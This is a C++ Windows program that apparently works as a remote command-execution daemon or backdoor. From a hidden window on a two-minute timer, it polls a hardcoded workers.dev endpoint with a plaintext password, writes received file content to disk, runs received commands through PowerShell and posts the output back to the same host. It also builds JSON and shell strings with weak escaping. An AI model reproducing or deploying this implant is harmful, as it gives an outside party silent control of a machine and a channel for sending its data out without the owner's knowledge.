#include <iostream>
#include <string>
#include <curl/curl.h>
#include <rapidjson/document.h>
#include <cstdio>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <array>
#include <windows.h>
#include <fstream>

static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}
std::string escapeChars(std::string str){
    std::string result="";
    for (char c:str){
        if(c==10) //newline
          result += "<br>";
        else if(c=='\t')
          result += "<t>";
        else if(c=='"')
          result += "\\\"";
        else if(c=='\\')
          result += "\\\\";
        else if(1<=c&&c<=31)
          continue;
        else
          result += c;
    }
    return result;
}
int saveFile(std::string str){
    std::ofstream outFile("FILE");
    if (outFile.is_open()) {
        outFile << str;
        outFile.close();
    } else {
        return 1;
    }
    return 0;
}
struct Result {
    int exitcode;
    std::string output;
};
int SendResultsToWorker(int jobId, Result res){
    //std::cout << "Job ID: "+std::to_string(jobId) << std::endl;
    //std::cout << "exit code: "+std::to_string(res.exitcode) << std::endl;
    //std::cout << "output: "+ res.output << std::endl;
    CURL *curl;
    CURLcode curlRes;
    curl = curl_easy_init();
    if(curl) {
      curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "POST");
      curl_easy_setopt(curl, CURLOPT_URL, "https://cleopatra.etcetra7n.workers.dev/api/send-results-to-worker");
      curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
      curl_easy_setopt(curl, CURLOPT_DEFAULT_PROTOCOL, "https");
      struct curl_slist *headers = NULL;
      headers = curl_slist_append(headers, "Authorization:Taurus:ThisIsTaurusPassword");
      curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
      std::string post = "{\"jobId\":" + std::to_string(jobId) +","+
                          "\"output\":\"" + res.output +"\","+
                          "\"exitCode\":" + std::to_string(res.exitcode) + "}";
      //std::cout << "final JSON BEGIN<"<< post<<">final JSON OVER"<<std::endl;
      curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post.c_str());
      curlRes = curl_easy_perform(curl);
      curl_slist_free_all(headers);
    }
    curl_easy_cleanup(curl);
    return 0;
}
Result exec(std::string rawcmd) {
    Result res;
    std::array<char, 128> buffer;
    std::string cmd;
    for (char c : rawcmd) {
        if (c == '"')
          cmd += "\\\"";
        else
          cmd += c;
    }
    cmd = "powershell -command \""+cmd+"\"";
    //std::cout << cmd << std::endl;
    FILE *pipe = popen(cmd.c_str(), "r");
    std::string rawoutput;
    if (!pipe) throw std::runtime_error("popen() failed!");
    while (!feof(pipe)) {
        if (fgets(buffer.data(), buffer.size(), pipe) != nullptr)
            rawoutput += buffer.data();
    }

    res.exitcode = pclose(pipe);
    //std::cout << "raw output: "+ rawoutput << std::endl;
    res.output = escapeChars(rawoutput);
    return res;
}

//void CronJob(){
void CALLBACK CronJob(HWND, UINT, UINT_PTR, DWORD){
  CURL *curl;
  CURLcode curlRes;
  std::string readBuffer;
  curl = curl_easy_init();
  if(curl) {
    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "GET");
    curl_easy_setopt(curl, CURLOPT_URL, "https://cleopatra.etcetra7n.workers.dev/api/fetch-daemon-job");
    curl_easy_setopt(curl, CURLOPT_DEFAULT_PROTOCOL, "https");
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Authorization:Taurus:ThisIsTaurusPassword");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
    curlRes = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    //std::cout <<"job recieved: "<< readBuffer<< "\n" << std::endl;

    rapidjson::StringStream json_stream(readBuffer.c_str());
    rapidjson::Document result;
    result.ParseStream(json_stream);
    const rapidjson::Value& jobs = result["body"];
    for (rapidjson::SizeType i = 0; i < jobs.Size(); i++){
        Result res;
        if (jobs[i]["file"].IsString()){
            if (saveFile(jobs[i]["file"].GetString()) == 1){
                res.exitcode = 501;
                res.output = "<FILE_ERROR>Failed to create file<FILE_ERROR>";
                SendResultsToWorker(jobs[i]["JOB_ID"].GetInt(), res);
                continue;
            }
        }
        std::string command = jobs[i]["command"].GetString();
        try{
            res = exec(command);
        } catch(const std::exception &e){
            res.exitcode=500;
            res.output += "<INTERNAL_ERROR>"+escapeChars(e.what())+"<INTERNAL_ERROR>";
        }
        SendResultsToWorker(jobs[i]["JOB_ID"].GetInt(), res);
    }
  }
}

int main(void)
{
    HWND hwnd = CreateWindowEx(0, "STATIC", NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, NULL, NULL);

    UINT_PTR timerId = SetTimer(hwnd, 1, 120000, CronJob); //60000 = 1 min
    if (!timerId) {
        std::cerr << "Failed to create timer.\n";
        return 1;
    }
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    KillTimer(hwnd, timerId);
    /*
    while (true) {
        CronJob();  // Call the function
        std::this_thread::sleep_for(std::chrono::seconds(30)); // Sleep for 1 minute
    }
    */
    return 0;
}